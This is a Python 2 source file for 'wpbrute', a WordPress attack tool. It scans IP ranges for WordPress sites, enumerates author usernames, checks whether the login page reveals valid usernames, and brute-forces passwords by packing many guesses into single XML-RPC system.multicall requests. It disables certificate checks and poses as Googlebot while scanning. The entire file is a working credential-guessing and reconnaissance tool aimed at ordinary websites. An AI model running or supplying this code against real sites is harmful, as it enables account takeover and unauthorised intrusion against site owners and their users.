#!/usr/bin/python2.7
from __future__ import print_function
import urllib2, ssl
import urllib
import sys, getopt
import re
import time
from beautifultable import BeautifulTable
import ipaddress
import socket
import signal

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGINT, signal.default_int_handler)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
banner = '''__          _______  ____  _____  _    _ _______ ______ 
\ \        / /  __ \|  _ \|  __ \| |  | |__   __|  ____|
 \ \  /\  / /| |__) | |_) | |__) | |  | |  | |  | |__   
  \ \/  \/ / |  ___/|  _ <|  _  /| |  | |  | |  |  __|  
   \  /\  /  | |    | |_) | | \ \| |__| |  | |  | |____ 
    \/  \/   |_|    |____/|_|  \_\\\\____/   |_|  |______|
Version: 1.0. '''+bcolors.WARNING+ "Works for Wordpress versions <4.4"+bcolors.ENDC+'''
+-+-+-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+
|d|e|v|e|l|o|p|e|d| |b|y|:| |A|n|g|e|l|o| |A|l|t|a|m|i|r|a|n|o|
+-+-+-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+\n'''

help = banner
help +='Usage: ./wpbrute [Mode of operation] [options]\n'
help +='MODES OF OPERATION:\n'
help +='  -S    Scan mode:  Scans subnet or ip for a wordpress installation\n'
help +='                    required: -t/--target\n'
help +='                    optional: --root-directory (e.g."/example/")\n'
help +='  -R    Recon mode: Checks if users can be enumerated, usernames bruteforced and xmlrpc requests sent\n'
help +='                    required: -t/--target\n'
help +='  -E    Enum mode:  Enumerates usernames.\n'
help +='                    required: -t/--target, -E [needs an argument]\n'
help +='  -B    Brute mode: Bruteforcing mode that performs the xmlrpc augmented bruteforcing attack (default mode)\n'
help +='                    required: -t/--target, -u/-U, -P\n'
help +='                    optional: --sleep-time\n'
help +='  -A    Auto mode:  Checks if the site is running wordpress, checks if XML-RPC is enabled, enumerates usernames\n'
help +='                    and starts augmented bruteforcing process. A fully automated bruteforcing mode.\n'
help +='                    required: -t/--target\n'
help +='OPTIONS:\n'
help +='  -t    target:     accepts the address of the target at the wordpress root path\n'
help +='                    ("--target=" can also be used)\n'
help +='  -u    username:   Accepts as an argument a username\n'
help +='  -U    usernames:  Accepts as an argument the path of the username list (not implemented yet)\n'
help +='  -P    passwords:  Accepts as an argument the path of the wordlist\n'
help +='  -h    help:       Prints the help information\n'
help +='  --sleep-time=     Sets the time in seconds in-between requests\n'
help +='  --root-directory= Sets the root directory of the wordpress installation (default is "/")\n'
help +='  --request-size=   Sets the size of the XML-RPC requests (<950 recommended)'
help +='\n'
help +='EXAMPLES:\n'
help +='  ./wpbrute.py -A -t http://127.0.0.1/wordpress4.3.19/\n'
help +='  ./wpbrute.py -R -t http://127.0.0.1/wordpress4.3.19/\n'
help +='  ./wpbrute.py -S -t 192.168.1.0/24 --root-directory=/wordpress4.3.19/\n'
help +='  ./wpbrute.py -E 5 -t http://127.0.0.1/wordpress4.3.19/\n'
help +='  ./wpbrute.py -B -t http://127.0.0.1/wordpress4.3.19/ -u me -P dictionaries/rockyou.txt --sleep-time=1\n'
help +=''
#check if username enumeration is possible
#return boolean stating if it is or not possible
def reconUserEnum(target):
    print(bcolors.OKBLUE+"Checking if user enumeration is possible..."+bcolors.ENDC)
    enum = False
    try:
        urllib2.urlopen(target+"?author=1").read()
        enum = True
        
    except urllib2.HTTPError, err:
        if err.code == 404:
            sys.exit("Url cannot be reached: 404 error")
        else:
            print("Http request error")
    except urllib2.URLError, err:
        print("Url error")
    if enum:
        print(bcolors.OKGREEN+"It is!"+bcolors.ENDC)
    else:
        print(bcolors.FAIL+"It is not!"+bcolors.ENDC)
    return enum

#check if the username can be bruteforced
#return boolean
def reconUserBrute(target):
    #check if user feedback is given
    print(bcolors.OKBLUE+"Is username bruteforcing possible..."+bcolors.ENDC)
    user_feed = False
    url = target + "wp-login.php"
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'
    header = { 'User-Agent' : user_agent }
    values = {
      'log':"ijaroghaaefkmsda", #random username we assume doesn't exist
      'pwd':"pass"
    }
    data = urllib.urlencode(values)
    
    #attempt to POST information to login
    try:
        req = urllib2.Request(url, data, header)
    except urllib2.HTTPError, err:
        if err.code == 404:
            sys.exit("Url cannot be reached: 404 error")
        else:
            sys.exit("Http request error")
    except urllib2.URLError, err:
        sys.exit("Url error")

    try:
        response = urllib2.urlopen(req).read()
        if response.find("Invalid username") >= 1:
            print(bcolors.OKGREEN+"It is!"+bcolors.ENDC)
            user_feed = True
        else:
            print(bcolors.WARNING+"It seems like username bruteforcing is not possible. Take into account that:")
            print("\t- If https logins are only allowed the url must start with https://")
            print("\t- The error message must be in english for this to work"+bcolors.ENDC)
    except:
        print(bcolors.FAIL+"urlopen failed for this host"+bcolors.ENDC)

    return user_feed

#check if a bruteforce amplification attack can be achieved
#return boolean value
def reconAmpl(target):
    #lots of false positives because all wordpress versions>=4.4 are not vulnerable
    print(bcolors.OKBLUE+"Checking if XML-RPC is enabled..."+bcolors.ENDC)
    xmlrpc = False
    #checking if an amplification bruteforce attack can be done
    url = target +"xmlrpc.php"
    data = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>"
    try:
        req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
        response = urllib2.urlopen(req).read()
        xmlrpc = True
    except urllib2.HTTPError, err:
        if err.code == 404:
            print(bcolors.FAIL+"It is not!"+bcolors.ENDC)
        else:
            print(bcolors.FAIL+"It is not!"+bcolors.ENDC)
    except urllib2.URLError, err:
        sys.exit("Url error")
    if xmlrpc:
        print(bcolors.OKGREEN+"It is!"+bcolors.ENDC)
        print(bcolors.OKBLUE+"Checking if XML-RPC wp.getUsersBlogs can be used..."+bcolors.ENDC)
        if response.find("wp.getUsersBlogs") != -1:
            print(bcolors.OKGREEN+"It can!"+bcolors.ENDC)
        else:
            print(bcolors.FAIL+"It can't!"+bcolors.ENDC)
            xmlrpc = False
    return xmlrpc


def recon(target): 
    print(bcolors.OKBLUE+"Recon for target "+target+bcolors.ENDC)
    enum = reconUserEnum(target)
    user_feed = reconUserBrute(target)
    xmlrpc = reconAmpl(target) 
    #create table with info collected
    print(bcolors.BOLD+"\nSummary of reconnaissance:"+bcolors.ENDC)
    table = BeautifulTable()
    table.column_headers = ["Name", "Found?"]
    if enum:
        table.append_row(["User enumeration", bcolors.OKGREEN+str(enum)])
    else:
        table.append_row(["User enumeration", bcolors.FAIL+str(enum)])
    if user_feed:
        table.append_row(["Username bruteforcing", bcolors.OKGREEN+str(user_feed)])
    else:
        table.append_row(["Username bruteforcing", bcolors.FAIL+str(user_feed)])
    if xmlrpc:
        table.append_row(["XML-RPC augmented vuln.*", bcolors.OKGREEN+str(xmlrpc)])
    else:
        table.append_row(["XML-RPC augmented vuln.*", bcolors.FAIL+str(xmlrpc)])
    print(table)
    print(bcolors.WARNING+"*Only applicable for Wordpress versions <4.4"+bcolors.ENDC)
    return [enum, user_feed, xmlrpc]

#returns list of enumerated usernames
#prints author information with the possible usernames 
#It is possible to find author information without usernames
def enum(target, n):
    users = []
    count = 1
    for i in range(0,n):
        try:
            response = urllib2.urlopen(target+"?author="+str(count))
            content = response.read()
            i = content.find("<title>") + 7
            j = content.find("</title>")
            content = content[i:j]
            print(bcolors.BOLD+"\tAuthor info:"+bcolors.ENDC+"\t"+ content) 
            urlpath = response.geturl()
            i = urlpath.find('/author/') + 8
            if i == 7:
                print(bcolors.BOLD+"\tusername:"+bcolors.ENDC+"\t"+"Not found")
            else:
                author = urlpath[i:-1]
                users.append(author)
                print(bcolors.BOLD+"\tusername:"+bcolors.ENDC+"\t"+author)
            count += 1
            print("")
        except urllib2.HTTPError, err:
            print(bcolors.WARNING+"User with id " + str(count-1) + " not found"+bcolors.ENDC)
            count += 1
        except KeyboardInterrupt:
            sys.exit()
        except:
            sys.exit("Exiting program")
    return users

#bruteforce amplification attack
def ampl(target, user_list, pass_path, chunk_size, sleep_time):
    print(bcolors.OKBLUE+'starting bruteforce amplification attack...'+bcolors.ENDC)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    data1 = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    data2 = ""
    data3 = '</data></array></value></param></params></methodCall>'
    f = open(pass_path)
    passwds = f.read().splitlines() #load all passwords from file into passwd list
    f.close()
    length = len(passwds)
    i = 0   #index in passwds list
    c = 0   #size of current chunk
    while i < length:
        #calculate time it takes to craft, send, and read request
        start_time = time.time()
        while c < chunk_size and i < length:
            for user in user_list:
                data2+= "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
                data2+= "<value><array><data><value><array><data><value><string>"+user
                data2+= "</string></value><value><string>"+passwds[i]+"</string></value></data></array></value></data></array></value></member></struct></value>"
            i += 1
            c += 1
        data = data1 + "" + data2 +""+ data3
        
        for attempt in range(0,3):
            try:
                req = urllib2.Request(target+"xmlrpc.php", data, headers={'Content-Type': 'application/xml'})
                rsp = urllib2.urlopen(req,context=ctx)
                break
            except:
                if attempt == 2:
                    sys.exit("Unreacheable. Try again later")
                print(bcolors.WARNING+"["+str(attempt)+"] Connection timed out. Waiting 5 seconds to retry..."+bcolors.ENDC)
                time.sleep(5)
                pass
        content = rsp.read()
        index = content.lower().find("isadmin")
        if index>=0: #if 'admin' was found
            rel_pos = content.count("403",0,index) #stop counting when reach index of 'admin' occurance
            abs_pos = ((i - c) + rel_pos)
            print(bcolors.OKBLUE+"password found! "+bcolors.OKGREEN + passwds[abs_pos]+bcolors.ENDC)
            sys.exit()
        #stop timer and calculate time taken to make request
        end_time = time.time()
        time_taken = end_time - start_time
        print(str(i) + " passwords attempted")
        c = 0 #reset chunk counter
        data2 = ""
        #only sleep if the time taken to make request exceeds the time desired between requests
        if time_taken<sleep_time:
            time.sleep(sleep_time-time_taken)
        
def findWp(target):
    url = target + "wp-content/"
    user_agent = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
    header = { 'User-Agent' : user_agent }
    try:
        req = urllib2.Request(url, None, header)
        response = urllib2.urlopen(req, timeout = 2).read()
        # print("Found wordpress in "+str(target)) #will only be able to read if wp-content directory is available
        return True
    except KeyboardInterrupt:
        sys.exit()
    except urllib2.HTTPError, err:
        if err.code == 404:
            return False
        else:
            return False
    except urllib2.URLError, err:
        return False
    except socket.timeout:
        return False
    except:
        return False

def getIps(ip, directory):
    patternIpv4 = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
    patternIpv4Cidr = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/(3[0-2]|[1-2][0-9]|[0-9]))$")
    if patternIpv4Cidr.match(ip):
        print(bcolors.OKBLUE+"scanning subnet for wordpress installations..."+bcolors.ENDC)
        try:
            net4 = ipaddress.ip_network(ip)

        except:
            print(bcolors.FAIL+'Invalid subnet!')
            sys.exit("EXITED")
        for ip in net4.hosts():
            try:
                wp = findWp("http://"+str(ip)+directory)
                if wp:
                    print(bcolors.OKGREEN+"Found wordpress at http://"+str(ip)+directory +bcolors.ENDC)
                else:
                    print('.',end="")
                    sys.stdout.flush()
            except KeyboardInterrupt:
                break
    elif patternIpv4.match(ip):
        print(bcolors.OKBLUE+'Scanning ip for wordpress installation...'+bcolors.ENDC)
        wp = findWp("http://"+str(ip)+directory)
        if wp:
           print(bcolors.OKGREEN+"Found wordpress at http://"+str(ip)+directory+bcolors.ENDC)
        else:
            print(bcolors.FAIL+"Not a wordpress site"+bcolors.ENDC)    
    else:
        print(bcolors.FAIL+'Invalid ip format!'+bcolors.ENDC)
        sys.exit()
    print('Finished scan')

def automatic(target,passwordfile,size,sleepTime):
    print(bcolors.OKBLUE+"Checking if "+target+" is a wordpress site..."+bcolors.ENDC)
    wp = findWp(target) #check if website is actually wordpress
    if wp:
        print(bcolors.OKGREEN+"It is!"+bcolors.ENDC)
    else:
        print(bcolors.FAIL+"It is not!"+bcolors.ENDC)
        sys.exit("Exiting program...")
    
    wp = reconAmpl(target)
    if not wp:
        sys.exit("Exiting program...")

    wp = reconUserEnum(target)
    if not wp:
        sys.exit("Exiting program...")
    print("")

    num = int(raw_input("How many usernames do you want to enumerate?:"))
    print(bcolors.OKBLUE+"Enumerating wordpress usernames..."+bcolors.ENDC)
    print("")
    users = enum(target,num)
    c = 0
    print(bcolors.OKBLUE+"Usernames found:"+bcolors.ENDC)
    for user in users:
        c = c + 1
        print("\t"+str(c)+") "+bcolors.OKGREEN+user+bcolors.ENDC)
    num = int(raw_input("Which username do you want to bruteforce?(1-"+str(c)+"):"))
    if 1<=num and num<c:
        user = users[num-1]
    else:
        print(bcolors.FAIL+"Incorrect input"+bcolors.FAIL)
        sys.exit("Exiting program...")
    
    if passwordfile == '':
        print("")
        print(bcolors.WARNING+"No password file inserted. Using default rockyou.txt wordlist."+bcolors.ENDC)
        passwordfile = "dictionaries/rockyou.txt"

    if size == 500:
        print("")
        print(bcolors.WARNING+"Size of multicall XML-RPC requests is not set"+bcolors.ENDC)
        size = int(raw_input("How big should the requests be? (<950 recommended):"))

    if sleepTime == 0.0:
        print("")
        print(bcolors.WARNING+"Sleep time between requests is not set"+bcolors.ENDC)
        sleepTime = int(raw_input("How long to wait in-between multicall requests? (seconds):"))
    ampl(target,[user],passwordfile,size,sleepTime)
    

def main(argv):
    r = False
    e = 0
    s = False
    a = False
    userfile = ''
    passwordfile = ''
    user = ''
    password = ''
    directory = '/'
    target = ''
    sleepTime = 0.0
    size = 500
    try:
        opts, rgs = getopt.getopt(argv,"hu:U:P:t:SRBAE:",["target=", "sleep-time=", "root-directory=","request-size="])
    except getopt.GetoptError:
        print(help)
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print(help)
            sys.exit()
        elif opt in {"-R"}:
            r = True
        elif opt in {"-E"}:
            e = int(arg)
        elif opt in ("-S"):
            s = True
        elif opt in ("-U"):
            userfile = arg
        elif opt in ("-P"):
            passwordfile = arg
        elif opt in ("-A"):
            a = True
        elif opt in ("-u"):
            user = arg
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("--sleep-time"):
            sleepTime = float(arg)
        elif opt in ("--root-directory"):
            directory = arg
        elif opt in ("--request-size"):
            size = int(arg)


    
    if target != "":
        print(banner)
        if a:
            automatic(target,passwordfile,size,sleepTime)
        elif r:
            recon(target)     #recon function
        elif e:
            enum(target,e)
        elif s:
            try:
                getIps(unicode(target), directory) #perform a subnet scan for wordpress sites, sanitize input
            except:
                sys.exit()
        elif user != None and passwordfile != None: #checks if user and password file are given
            ampl(target,[user],passwordfile,size, sleepTime) #if sleepTime not specified then the default is to not sleep
    else:
        print(bcolors.WARNING+'Target machine is required! Use "-h" for more information.'+bcolors.ENDC)
    
        
if __name__ == "__main__":
   main(sys.argv[1:])
